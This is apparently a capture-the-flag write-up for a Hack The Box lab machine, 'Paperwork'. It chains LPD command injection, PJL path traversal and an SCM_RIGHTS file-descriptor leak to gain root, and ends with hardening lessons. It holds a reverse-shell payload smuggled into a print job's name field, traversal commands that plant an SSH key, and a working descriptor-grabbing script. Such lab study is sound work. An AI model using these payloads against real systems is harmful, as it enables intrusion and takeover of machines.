# HTB: Paperwork — Write-up

**Target:** 10.129.32.24 (paperwork.htb)
**Difficulty path:** lp → archivist → root

## Summary

The box exposes a custom LPD (line printer daemon) service that is vulnerable to
shell command injection via a print job's control-file "job name" field, giving
an initial foothold as `lp`. From there, a second custom printer service
(`jetdirect.py`, running as `archivist`) implements a subset of PJL filesystem
commands with no path sanitization, allowing arbitrary file read/write as
`archivist` via path traversal — used to drop an SSH key into
`~archivist/.ssh/authorized_keys`. Finally, a root-owned management daemon
(`paperwork-daemon`) listening on a Unix socket leaks a root-owned file
descriptor to `/etc/paperwork/admin_pins.conf` via `SCM_RIGHTS` ancillary data
whenever it detects "malicious" activity in a shared log file — an activity
condition trivially satisfied by the prior exploitation steps. The leaked file
contains root's password directly.

---

## 1. Recon

```
nmap -sCV -T4 10.129.32.24 -p22,80,1515
```

- 22/tcp — OpenSSH
- 80/tcp — nginx, "Intranet | Document Archiving Service" (paperwork.htb)
- 1515/tcp — custom LPD-like service ("Archive_Printer is ready and printing.")

Site links to a download of its own source, `paperwork-archive-v1.02.zip`,
containing `server.py` — the code running on port 1515.

## 2. Foothold as `lp` — LPD command injection

`server.py` handles LPD print jobs (RFC 1179). Two bugs:

**a) Queue-name check is a substring check, not membership:**
```python
if queue not in VALID_QUEUE:
```
`VALID_QUEUE` is a plain string. An **empty queue name** is a substring of
any string, so it always passes — no need to know/guess the real queue name.

**b) Job name is used unsanitized inside a shell string:**
```python
subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```
`job_name` is taken from a `J` line inside the attacker-supplied LPD control
file. Breaking out of the single quotes gives arbitrary command execution.

**Exploit flow (RFC 1179 over raw TCP to port 1515):**
1. Send `\x02` + empty queue + `\n` → job accepted (buggy substring check).
2. Send subcommand `\x02` (receive control file) + `"<size> <filename>\n"`.
3. Send the control file content, with a `J` line such as:
   ```
   Jx'; bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"; echo '
   ```
4. Terminate with `\x00`.

Result: reverse shell as `lp`.

## 3. `lp` → `archivist` — PJL path traversal (arbitrary read/write)

```
ps aux | grep archivist
```
shows `/home/archivist/printer/jetdirect.py 9100 ...` running as `archivist`,
bound to `127.0.0.1:9100` only. Even without read access to the script, the
protocol is standard **PJL** (Printer Job Language), so it can be black-box
probed with UEL-wrapped commands (`\x1b%-12345X`):

- `@PJL FSDIRLIST NAME="<path>"`
- `@PJL FSUPLOAD NAME="<path>" OFFSET=0 SIZE=<n>` (read)
- `@PJL FSDOWNLOAD NAME="<path>" SIZE=<n>` (write, raw bytes follow the header)

The (later-recovered) source confirms the bug — `Filesystem._translate()`:
```python
def _translate(self, path):
    clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
    return os.path.normpath(os.path.join(self._root, clean))
```
No traversal check — `../` sequences escape the spool root
(`/home/archivist/printer/`) freely.

**Exploit:**
```
@PJL FSDIRLIST NAME="../" ENTRY=1 COUNT=999      -> lists /home/archivist/
@PJL FSUPLOAD NAME="../.ssh/authorized_keys" ... -> confirms empty/missing file
@PJL FSDOWNLOAD NAME="../.ssh/authorized_keys" SIZE=<n>
<raw bytes of attacker's SSH public key>
```
`.ssh/` already existed, so no `FSMKDIR` was even required. This writes an
attacker-controlled public key directly into `archivist`'s `authorized_keys`.

Result: `ssh -i archivist_key archivist@10.129.32.24`.

## 4. `archivist` → `root` — SCM_RIGHTS file descriptor leak

Enumeration as `archivist` turns up a root-owned, group-writable Unix socket:
```
/run/paperwork/mgmt.sock   (root:archivist, 0660)
```
backed by `/usr/bin/paperwork-daemon` (readable once logged in as archivist),
run as root via `/etc/systemd/system/paperwork.service`.

Key logic:
```python
def scan_for_malice():
    with open(LOG_PATH) as f:
        content = f.read().upper()
        if any(t in content for t in ["FSQUERY","FSUPLOAD","FSDOWNLOAD"]):
            return True
    return False

def trigger_lockdown(conn):
    log_fd = os.open(LOG_PATH, os.O_RDONLY)
    evidence_bundle = array.array("i", [log_fd, admin_fd])
    conn.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])
    ...
```
`admin_fd` was opened once at daemon startup, as root, against
`/etc/paperwork/admin_pins.conf` (not otherwise readable by `archivist`).

`commands.log` is the same log file `jetdirect.py` writes every received PJL
command to — and it already contains `FSQUERY`/`FSUPLOAD`/`FSDOWNLOAD` from
step 3's exploitation. So the very next connection to `mgmt.sock` trips the
"lockdown" branch, which — intending to send "forensic evidence" to an
alerted admin — passes the **already-open root file descriptor** for
`admin_pins.conf` across the socket via `SCM_RIGHTS`.

This is the core flaw: **Unix permission checks happen at `open()`, not at
each `read()`.** Once a file descriptor is duplicated into another process via
`SCM_RIGHTS`, the receiving process can read it freely regardless of its own
permissions on the underlying path.

**Exploit:** connect to the socket and properly receive ancillary data
(a plain `recv()` silently discards it — must use `recvmsg()` with a
`SCM_RIGHTS`-sized control buffer):

```python
import socket, array, os

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/run/paperwork/mgmt.sock")

fds = array.array("i")
cmsg_space = socket.CMSG_LEN(4 * fds.itemsize)
msg, ancdata, flags, addr = s.recvmsg(4096, cmsg_space)

for level, typ, data in ancdata:
    if level == socket.SOL_SOCKET and typ == socket.SCM_RIGHTS:
        fds.frombytes(data[:len(data) - (len(data) % fds.itemsize)])

for fd in fds:
    print(os.pread(fd, 4096, 0))
```

Output includes:
```
ADMIN_PASSWORD=ApparelMortuaryCedar22
```

Result:
```
su - root
Password: ApparelMortuaryCedar22
```
→ root.

---

## Root cause summary

| Step | Root cause |
|---|---|
| `lp` foothold | Substring check used for equality (`queue not in VALID_QUEUE`); unsanitized f-string into `shell=True` |
| `archivist` | No path traversal sanitization in a custom PJL filesystem implementation |
| `root` | Root process passes a privileged file descriptor to an unprivileged client over a Unix socket, gated only by a same-machine "trust" condition (log content) the unprivileged user fully controls |

## Lessons / hardening takeaways

- Never build shell commands with string interpolation; use `shlex.quote()` or avoid `shell=True` entirely with argument lists.
- Membership checks (`in`) on strings are substring checks — validate against a set/list, or use `==`.
- Any custom filesystem-over-network protocol needs to resolve and confirm paths stay under an allowed root (`os.path.commonpath` check after `realpath`), not just `normpath`+`join`.
- `SCM_RIGHTS` should never be sent to a peer whose trust level triggered the very code path attempting to hand off privileged access — the "security alert" mechanism here is itself the privilege escalation.
